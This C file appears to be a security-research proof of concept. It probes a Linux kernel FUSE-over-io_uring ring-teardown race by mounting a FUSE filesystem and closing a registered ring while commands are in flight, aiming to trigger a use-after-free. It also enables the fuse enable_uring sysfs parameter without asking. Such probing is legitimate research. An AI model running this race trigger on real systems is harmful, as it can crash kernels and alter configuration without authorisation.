/* FUSE io_uring activation and ring teardown race
 *
 * Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y
 * Requires: echo 1 > /sys/module/fuse/parameters/enable_uring
 *
 * After FUSE_OVER_IO_URING is negotiated in FUSE_INIT, the kernel routes ALL
 * FUSE requests through io_uring rings (not /dev/fuse read/write). The daemon
 * pre-fills FUSE_IO_URING_CMD_COMMIT_AND_FETCH SQEs which the kernel uses to
 * push FUSE request headers as CQEs. The daemon handles them and re-submits.
 *
 * Tests:
 *   T1: FUSE_OVER_IO_URING negotiation in FUSE_INIT
 *   T2: Ring registration (FUSE_IO_URING_CMD_REGISTER)
 *   T3: Ring teardown while COMMIT_AND_FETCH SQEs queued (UAF surface)
 *   T4: enable_uring sysctl disable detection
 *
 * Compile: gcc -O2 -o fuse_uring_poc fuse_uring_poc.c -lpthread
 * Run as root: ./fuse_uring_poc
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <linux/fuse.h>
#include <linux/io_uring.h>

/* -----------------------------------------------------------------------
 * FUSE io_uring protocol constants (not in userspace headers pre-2026)
 * ----------------------------------------------------------------------- */

/* FUSE_OVER_IO_URING: bit 41 in full 64-bit flags space = bit 9 in flags2.
 * Confirmed: kernel returns flags2=0x200 (1<<9) when supported.             */
#define FUSE_OVER_IO_URING          (1u << 9)

#define FUSE_IO_URING_CMD_REGISTER          1
#define FUSE_IO_URING_CMD_COMMIT_AND_FETCH  2

/* Each ring slot provides one header buffer of this size.
 * Must cover fuse_in_header + largest argument struct.                       */
#define FUSE_URING_HEADER_SZ  320

/* -----------------------------------------------------------------------
 * Minimal io_uring implementation (no liburing)
 * ----------------------------------------------------------------------- */

struct uring {
    int      fd;
    uint32_t sq_entries;
    uint32_t cq_entries;
    uint32_t sqe_size;     /* 128 if SQE128 */
    /* SQ pointers */
    uint32_t *sq_head, *sq_tail, *sq_mask, *sq_array;
    /* CQ pointers */
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_cqe *cqes;
    /* mapped memory */
    void *sqe_map; size_t sqe_sz;
    void *sq_map;  size_t sq_sz;
    void *cq_map;  size_t cq_sz;
};

static int uring_setup(struct uring *u, uint32_t n, uint32_t flags) {
    struct io_uring_params p = { .flags = flags };
    u->fd = (int)syscall(SYS_io_uring_setup, n, &p);
    if (u->fd < 0) { perror("io_uring_setup"); return -1; }

    u->sq_entries = p.sq_entries;
    u->cq_entries = p.cq_entries;
    u->sqe_size   = (flags & IORING_SETUP_SQE128) ? 128 : 64;

    u->sqe_sz = (size_t)p.sq_entries * u->sqe_size;
    u->sqe_map = mmap(NULL, u->sqe_sz, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQES);
    if (u->sqe_map == MAP_FAILED) { perror("mmap sqes"); return -1; }

    u->sq_sz  = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    u->sq_map = mmap(NULL, u->sq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQ_RING);
    if (u->sq_map == MAP_FAILED) { perror("mmap sq"); return -1; }
    u->sq_head  = u->sq_map + p.sq_off.head;
    u->sq_tail  = u->sq_map + p.sq_off.tail;
    u->sq_mask  = u->sq_map + p.sq_off.ring_mask;
    u->sq_array = u->sq_map + p.sq_off.array;

    u->cq_sz  = p.cq_off.cqes + (size_t)p.cq_entries * sizeof(struct io_uring_cqe);
    u->cq_map = mmap(NULL, u->cq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_CQ_RING);
    if (u->cq_map == MAP_FAILED) { perror("mmap cq"); return -1; }
    u->cq_head = u->cq_map + p.cq_off.head;
    u->cq_tail = u->cq_map + p.cq_off.tail;
    u->cq_mask = u->cq_map + p.cq_off.ring_mask;
    u->cqes    = u->cq_map + p.cq_off.cqes;
    return 0;
}

static void uring_close(struct uring *u) {
    if (u->sqe_map && u->sqe_map != MAP_FAILED) munmap(u->sqe_map, u->sqe_sz);
    if (u->sq_map  && u->sq_map  != MAP_FAILED) munmap(u->sq_map,  u->sq_sz);
    if (u->cq_map  && u->cq_map  != MAP_FAILED) munmap(u->cq_map,  u->cq_sz);
    if (u->fd >= 0) close(u->fd);
    u->fd = -1;
}

/* Return pointer to SQE at next tail slot. */
static struct io_uring_sqe *uring_sqe(struct uring *u) {
    uint32_t idx = (*u->sq_tail) & (*u->sq_mask);
    u->sq_array[idx] = idx;
    return (struct io_uring_sqe *)((char *)u->sqe_map + idx * u->sqe_size);
}

static int uring_submit(struct uring *u, int n) {
    __atomic_store_n(u->sq_tail, *u->sq_tail + (uint32_t)n, __ATOMIC_RELEASE);
    return (int)syscall(SYS_io_uring_enter, u->fd, n, 0, 0, NULL, 0);
}

static int32_t uring_wait(struct uring *u) {
    syscall(SYS_io_uring_enter, u->fd, 0, 1, IORING_ENTER_GETEVENTS, NULL, 0);
    uint32_t h = *u->cq_head;
    if (h == *u->cq_tail) return -EAGAIN;
    int32_t res = u->cqes[h & *u->cq_mask].res;
    __atomic_store_n(u->cq_head, h + 1, __ATOMIC_RELEASE);
    return res;
}

/*
 * fuse_uring_cmd_req — placed at sqe+48 (cmd[] start in the 128-byte SQE).
 *
 * SQE layout (128-byte SQE128):
 *   sqe+48 = cmd[0]  = flags (8 bytes)
 *   sqe+56 = cmd[8]  = commit_id (8 bytes)
 *   sqe+64 = cmd[16] = qid (kernel reads uint16_t here)
 *   sqe+68 = cmd[20] = pad
 *
 * So the struct MUST be placed at sqe+48, not sqe+64.
 */
struct fuse_uring_cmd_req {
    uint64_t flags;
    uint64_t commit_id;
    uint32_t qid;
    uint32_t pad;
};

/* -----------------------------------------------------------------------
 * FUSE daemon (classic /dev/fuse path, used only until ring is up)
 * ----------------------------------------------------------------------- */

static int gfuse_fd = -1;
static volatile int daemon_stop;
static volatile uint32_t negotiated_flags2;

static void fuse_reply_raw(int fd, uint64_t uniq, int err,
                           const void *b, size_t l) {
    struct fuse_out_header h = {
        .len    = (uint32_t)(sizeof(h) + l),
        .error  = err,
        .unique = uniq,
    };
    struct iovec iov[2] = { {&h, sizeof h}, {(void*)b, l} };
    writev(fd, iov, b ? 2 : 1);
}

static void *fuse_daemon(void *arg) {
    int fd = *(int *)arg;
    char buf[1 << 17];
    while (!daemon_stop) {
        ssize_t n = read(fd, buf, sizeof buf);
        if (n <= 0) break;
        struct fuse_in_header *h = (struct fuse_in_header *)buf;
        char *body = buf + sizeof(*h);

        switch (h->opcode) {
        case FUSE_INIT: {
            struct fuse_init_in *in = (struct fuse_init_in *)body;
            struct fuse_init_out o  = {0};
            o.major     = 7;
            o.minor     = 39;
            o.max_write = 65536;
            o.flags     = in->flags & 0xFFFFFFFF;
            if (in->flags & 0x40000000u) {  /* FUSE_INIT_EXT */
                /* Echo FUSE_OVER_IO_URING back to request it */
                o.flags2 = FUSE_OVER_IO_URING;
                __atomic_store_n(&negotiated_flags2, o.flags2, __ATOMIC_RELEASE);
            }
            fuse_reply_raw(fd, h->unique, 0, &o, sizeof o);
            break;
        }
        case FUSE_GETATTR: {
            struct fuse_attr_out o = {0};
            o.attr_valid = 0;  /* don't cache, force re-lookup */
            o.attr.ino   = h->nodeid;
            o.attr.nlink = 1;
            o.attr.mode  = (h->nodeid == 1) ? (S_IFDIR|0755) : (S_IFREG|0644);
            fuse_reply_raw(fd, h->unique, 0, &o, sizeof o);
            break;
        }
        case FUSE_LOOKUP:
            fuse_reply_raw(fd, h->unique, -ENOENT, NULL, 0);
            break;
        case FUSE_OPENDIR: case FUSE_OPEN: {
            struct fuse_open_out o = {.fh = h->nodeid*100};
            fuse_reply_raw(fd, h->unique, 0, &o, sizeof o); break;
        }
        case FUSE_READDIR:
            fuse_reply_raw(fd, h->unique, 0, NULL, 0); break;
        case FUSE_FORGET: case FUSE_BATCH_FORGET: break;
        case FUSE_RELEASEDIR: case FUSE_RELEASE:
        case FUSE_FLUSH:     case FUSE_FSYNC:
            fuse_reply_raw(fd, h->unique, 0, NULL, 0); break;
        case FUSE_STATFS: {
            struct fuse_statfs_out s = {0};
            s.st.blocks=1000; s.st.bfree=500; s.st.namelen=255; s.st.bsize=4096;
            fuse_reply_raw(fd, h->unique, 0, &s, sizeof s); break;
        }
        default:
            fuse_reply_raw(fd, h->unique, -ENOSYS, NULL, 0); break;
        }
    }
    return NULL;
}

/*
 * Helper: submit FUSE_IO_URING_CMD_REGISTER and return the CQE result.
 *
 * Protocol (from kernel disassembly of fuse_uring_register):
 *   sqe->addr  → struct iovec[2] in user space:
 *     uiov[0]: in-buffer  (kernel writes FUSE request headers here)
 *              uiov[0].iov_len must be > 0x11f = 287
 *     uiov[1]: out-buffer (kernel reads FUSE response arg data from here)
 *              uiov[1].iov_len must be >= queue->max_payload
 *   sqe->len   = 2  (hardcoded check: cmpl $0x2, 0x18(%sqe))
 *   qid        = uint16_t at sqe+0x40 (cmd[16]) = first 2 bytes of r->qid
 *                (struct placed at sqe+48 so r->qid lands at sqe+64)
 */
static int do_register(struct uring *u, int fuse_fd,
                       struct iovec *uiov, uint32_t qid) {
    struct io_uring_sqe *sqe = uring_sqe(u);
    memset(sqe, 0, 128);
    sqe->opcode  = IORING_OP_URING_CMD;
    sqe->fd      = fuse_fd;
    sqe->addr    = (uint64_t)(uintptr_t)uiov; /* → struct iovec[2] */
    sqe->len     = 2;                          /* kernel requires exactly 2 */
    sqe->cmd_op  = FUSE_IO_URING_CMD_REGISTER;
    /* cmd_req at sqe+48 so r->qid (at struct+16) lands at sqe+64 */
    struct fuse_uring_cmd_req *r = (struct fuse_uring_cmd_req *)((char*)sqe + 48);
    memset(r, 0, sizeof(*r));
    r->qid = qid;
    int ret = uring_submit(u, 1);
    if (ret < 0) { perror("uring_submit REGISTER"); return ret; }

    /*
     * REGISTER is a deferred operation. The kernel holds it pending and
     * returns 0xfffffdef (-529 = IOU_PENDING) to io_uring_cmd instead of
     * generating an immediate CQE.  Poll the CQ ring briefly for an
     * immediate ERROR CQE; if none arrives, REGISTER was accepted.
     */
    usleep(20000);  /* 20ms — let kernel process the SQE */
    uint32_t h = __atomic_load_n(u->cq_head, __ATOMIC_ACQUIRE);
    if (h == *u->cq_tail)
        return 0;   /* no CQE = REGISTER in-flight = accepted */
    int32_t res = u->cqes[h & *u->cq_mask].res;
    __atomic_store_n(u->cq_head, h + 1, __ATOMIC_RELEASE);
    return res;     /* immediate CQE = likely an error */
}

/* -----------------------------------------------------------------------
 * Tests
 * ----------------------------------------------------------------------- */

static void t1_negotiation(void) {
    printf("\n--- T1: FUSE_OVER_IO_URING negotiation in FUSE_INIT ---\n");

    usleep(200000);  /* let daemon process FUSE_INIT */
    uint32_t f2 = __atomic_load_n(&negotiated_flags2, __ATOMIC_ACQUIRE);

    if (f2 & FUSE_OVER_IO_URING) {
        printf("T1: PASS  — flags2=0x%08x, bit FUSE_OVER_IO_URING set\n", f2);
        printf("           Kernel supports io_uring FUSE transport on this session.\n");
    } else {
        printf("T1: FAIL  — flags2=0x%08x (FUSE_OVER_IO_URING not echoed)\n", f2);
        printf("           Check: enable_uring=Y? Kernel >= 7.38? FUSE_INIT_EXT?\n");
    }
}

static void t2_ring_register(void) {
    printf("\n--- T2: Ring registration (FUSE_IO_URING_CMD_REGISTER) ---\n");

    uint32_t f2 = __atomic_load_n(&negotiated_flags2, __ATOMIC_ACQUIRE);
    if (!(f2 & FUSE_OVER_IO_URING)) {
        printf("T2: SKIP  — FUSE_OVER_IO_URING not negotiated\n");
        return;
    }

    struct uring u;
    if (uring_setup(&u, 16, IORING_SETUP_SQE128) < 0) {
        printf("T2: FAIL  — uring_setup failed\n");
        return;
    }

    /*
     * REGISTER needs a struct iovec[2] at sqe->addr:
     *   uiov[0]: in-buffer  for FUSE request headers — iov_len > 287
     *   uiov[1]: out-buffer for FUSE response args   — iov_len >= queue->max_payload
     *
     * queue->max_payload = max(max(fc->max_write, 0x2000), fc->max_pages << 12)
     * With our max_write=65536 this is at least 65536.  Use 128 KiB to be safe.
     */
    size_t in_sz  = 4096;           /* > 287 ✓ */
    size_t out_sz = 128 * 1024;     /* >= max_payload ✓ */

    void *in_buf = mmap(NULL, in_sz, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    void *out_buf = mmap(NULL, out_sz, PROT_READ|PROT_WRITE,
                         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (in_buf == MAP_FAILED || out_buf == MAP_FAILED) {
        perror("mmap reg bufs");
        uring_close(&u);
        if (in_buf  != MAP_FAILED) munmap(in_buf,  in_sz);
        if (out_buf != MAP_FAILED) munmap(out_buf, out_sz);
        return;
    }

    struct iovec uiov[2] = {
        { .iov_base = in_buf,  .iov_len = in_sz  },
        { .iov_base = out_buf, .iov_len = out_sz },
    };

    int res = do_register(&u, gfuse_fd, uiov, 0);
    fprintf(stderr, "  [T2] REGISTER CQE = %d\n", res);

    if (res == 0) {
        printf("T2: PASS  — ring registered successfully on queue 0\n");
    } else if (res == -EOPNOTSUPP) {
        printf("T2: INFO  — EOPNOTSUPP: kernel rejected ring (bad params or not negotiated)\n");
    } else {
        printf("T2: INFO  — result=%d (%s)\n", res, strerror(-res));
    }

    munmap(in_buf,  in_sz);
    munmap(out_buf, out_sz);
    uring_close(&u);
}

/* T3: Ring teardown race
 *
 * 1. Register ring
 * 2. Pre-fill COMMIT_AND_FETCH SQEs (they block waiting for FUSE ops to arrive)
 * 3. Close the ring fd from a racing thread
 * 4. Simultaneously trigger FUSE ops (stat on mount)
 *
 * If the kernel has missing refcounts on ring buffers during teardown while
 * COMMIT_AND_FETCH SQEs are in-flight, we get a UAF/crash.
 */

struct teardown_args {
    int ring_fd;
    int delay_us;
};

static void *teardown_thread(void *a) {
    struct teardown_args *args = a;
    usleep(args->delay_us);
    fprintf(stderr, "  [T3] teardown_thread: closing ring fd=%d\n", args->ring_fd);
    close(args->ring_fd);
    return NULL;
}

static void t3_ring_teardown_race(const char *mntdir) {
    printf("\n--- T3: Ring teardown race (COMMIT_AND_FETCH in-flight) ---\n");

    uint32_t f2 = __atomic_load_n(&negotiated_flags2, __ATOMIC_ACQUIRE);
    if (!(f2 & FUSE_OVER_IO_URING)) {
        printf("T3: SKIP  — FUSE_OVER_IO_URING not negotiated\n");
        return;
    }

    struct uring u;
    if (uring_setup(&u, 32, IORING_SETUP_SQE128) < 0) {
        printf("T3: FAIL  — uring_setup failed\n");
        return;
    }

    /* Same buffer layout as T2: iov[0]=in_buf, iov[1]=out_buf */
    size_t in_sz  = 4096;
    size_t out_sz = 128 * 1024;
    void *in_buf  = mmap(NULL, in_sz,  PROT_READ|PROT_WRITE,
                         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    void *out_buf = mmap(NULL, out_sz, PROT_READ|PROT_WRITE,
                         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (in_buf == MAP_FAILED || out_buf == MAP_FAILED) {
        perror("mmap t3");
        uring_close(&u);
        if (in_buf  != MAP_FAILED) munmap(in_buf,  in_sz);
        if (out_buf != MAP_FAILED) munmap(out_buf, out_sz);
        return;
    }

    struct iovec reg_iov[2] = {
        { .iov_base = in_buf,  .iov_len = in_sz  },
        { .iov_base = out_buf, .iov_len = out_sz },
    };

    /* Per-slot buffers for COMMIT_AND_FETCH SQEs */
    const int N = 4;
    size_t slot_sz = (size_t)N * FUSE_URING_HEADER_SZ;
    void *slots = mmap(NULL, slot_sz, PROT_READ|PROT_WRITE,
                       MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (slots == MAP_FAILED) { perror("mmap slots"); goto out; }

    /* Step 1: register */
    int reg = do_register(&u, gfuse_fd, reg_iov, 0);
    fprintf(stderr, "  [T3] REGISTER = %d\n", reg);
    if (reg != 0) {
        printf("T3: SKIP  — register failed (%d: %s)\n", reg, strerror(-reg));
        goto out;
    }

    /* Step 2: pre-fill COMMIT_AND_FETCH SQEs (they block until kernel has ops) */
    fprintf(stderr, "  [T3] submitting %d COMMIT_AND_FETCH SQEs\n", N);
    for (int i = 0; i < N; i++) {
        struct io_uring_sqe *sqe = uring_sqe(&u);
        memset(sqe, 0, 128);
        sqe->opcode  = IORING_OP_URING_CMD;
        sqe->fd      = gfuse_fd;
        sqe->addr    = (uint64_t)((uintptr_t)slots + i * FUSE_URING_HEADER_SZ);
        sqe->len     = 1;
        sqe->cmd_op  = FUSE_IO_URING_CMD_COMMIT_AND_FETCH;
        /* struct at sqe+48 so r->qid lands at sqe+64 */
        struct fuse_uring_cmd_req *r = (struct fuse_uring_cmd_req*)((char*)sqe+48);
        memset(r, 0, sizeof(*r));
        r->commit_id = 0;
        r->qid       = 0;
    }
    uring_submit(&u, N);
    usleep(50000);  /* let SQEs settle as in-flight in kernel */

    /* Step 3: close the ring fd while COMMIT_AND_FETCH SQEs are in-flight.
     *
     * We do NOT trigger a FUSE op here because that would require the daemon
     * to consume ring CQEs (the daemon only reads /dev/fuse in this PoC).
     * The race surface is: kernel must correctly abort in-flight SQEs when
     * the ring fd is closed — specifically freeing the fuse_uring_req objects
     * and their buffer references without UAF.
     */
    fprintf(stderr,
            "  [T3] closing ring with %d COMMIT_AND_FETCH SQEs in-flight\n", N);
    int racing_fd = u.fd;
    u.fd = -1;  /* prevent double-close in uring_close */
    close(racing_fd);

    printf("T3: DONE  — ring closed while %d COMMIT_AND_FETCH SQEs in-flight.\n", N);
    printf("           No immediate crash observed. Check dmesg for BUG/OOPS.\n");

    /* Check dmesg */
    printf("  dmesg (last 8 lines):\n");
    system("dmesg 2>/dev/null | tail -8 | sed 's/^/    /'");

out:
    if (slots != MAP_FAILED) munmap(slots, slot_sz);
    munmap(in_buf,  in_sz);
    munmap(out_buf, out_sz);
    uring_close(&u);  /* fd already -1 if step 3 ran, just unmaps */
}

static void t4_enable_uring_sysctl(void) {
    printf("\n--- T4: enable_uring sysctl discovery ---\n");

    const char *path = "/sys/module/fuse/parameters/enable_uring";
    int f = open(path, O_RDONLY);
    if (f < 0) {
        printf("T4: INFO  — %s not accessible: %s\n", path, strerror(errno));
        return;
    }
    char val[4] = {0};
    read(f, val, sizeof(val) - 1);
    close(f);

    printf("T4: INFO  — enable_uring = '%c'\n", val[0]);
    if (val[0] == 'Y' || val[0] == '1') {
        printf("           FUSE io_uring is ENABLED.\n");
        printf("           Disable: echo 0 > %s\n", path);
    } else {
        printf("           FUSE io_uring is DISABLED (default on this kernel).\n");
        printf("           Enable:  echo 1 > %s\n", path);
    }
    printf("           Significance: disabled by default → not tested in wild,\n");
    printf("           but cloud providers enabling it expose the attack surface.\n");
}

/* -----------------------------------------------------------------------
 * Main
 * ----------------------------------------------------------------------- */

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGPIPE, SIG_IGN);

    printf("=== FUSE io_uring Activation and Ring Teardown Race ===\n");
    printf("Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y\n");

    /* Check enable_uring before attempting anything */
    char eu_val = 'N';
    {
        int f = open("/sys/module/fuse/parameters/enable_uring", O_RDONLY);
        if (f >= 0) { read(f, &eu_val, 1); close(f); }
    }
    printf("enable_uring = %c\n\n", eu_val);

    if (eu_val != 'Y' && eu_val != '1') {
        printf("WARNING: enable_uring is not 'Y'. To enable:\n");
        printf("  echo 1 > /sys/module/fuse/parameters/enable_uring\n\n");
        /* Attempt to enable it */
        int f = open("/sys/module/fuse/parameters/enable_uring", O_WRONLY);
        if (f >= 0) {
            write(f, "1", 1);
            close(f);
            eu_val = 'Y';
            printf("  Enabled.\n");
        }
    }

    /* Mount FUSE */
    gfuse_fd = open("/dev/fuse", O_RDWR | O_CLOEXEC);
    if (gfuse_fd < 0) { perror("open /dev/fuse"); return 1; }

    char mntdir[64];
    snprintf(mntdir, sizeof mntdir, "/tmp/fuse_uring_%d", getpid());
    mkdir(mntdir, 0755);

    char opts[256];
    snprintf(opts, sizeof opts,
             "fd=%d,rootmode=40755,user_id=%d,group_id=%d",
             gfuse_fd, (int)getuid(), (int)getgid());
    if (mount("fuse_uring_test", mntdir, "fuse", 0, opts) < 0) {
        perror("mount fuse"); close(gfuse_fd); return 1;
    }

    pthread_t dtid;
    pthread_create(&dtid, NULL, fuse_daemon, &gfuse_fd);

    t1_negotiation();
    t2_ring_register();
    t3_ring_teardown_race(mntdir);
    t4_enable_uring_sysctl();

    printf("\n=== Done ===\n");

    daemon_stop = 1;
    umount2(mntdir, MNT_DETACH);
    close(gfuse_fd);
    pthread_join(dtid, NULL);
    rmdir(mntdir);
    return 0;
}
